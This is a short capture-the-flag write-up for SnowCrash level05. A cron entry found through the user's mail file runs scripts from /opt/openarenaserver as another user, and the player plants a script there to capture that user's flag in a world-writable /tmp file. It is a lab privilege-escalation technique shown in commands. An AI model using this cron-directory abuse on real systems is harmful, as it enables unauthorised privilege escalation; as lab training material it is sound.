#SnowCrash Level05

At first we find nothing at the home directory.
After checking the enviroment variables, we find :
```
level05@SnowCrash:~$ env
	[...]
	MAIL=/var/mail/level05
	[...]
```

Cating that :
```
level05@SnowCrash:~$ cat $MAIL
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Interesting, let's see what the script does : (knowing that every 2nd minute
the script launched.)
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So basically in every 2nd minutes every script in ```/opt/openarenaserver``` is
executed. And then deleted.
Let's create a .txt file and give it the right permissions so flag05 can write to it :
```
level05@SnowCrash:~$ touch /tmp/gitflag
level05@SnowCrash:~$ chmod 777 /tmp/gitflag
level05@SnowCrash:~$ vim /opt/openarenaserver/gf.sh
	[...]
	#!/bin/sh
	getflag > /tmp/gitflag
	[...]
level05@SnowCrash:~$ cat /tmp/gitflag
Check flag.Here is your token :
```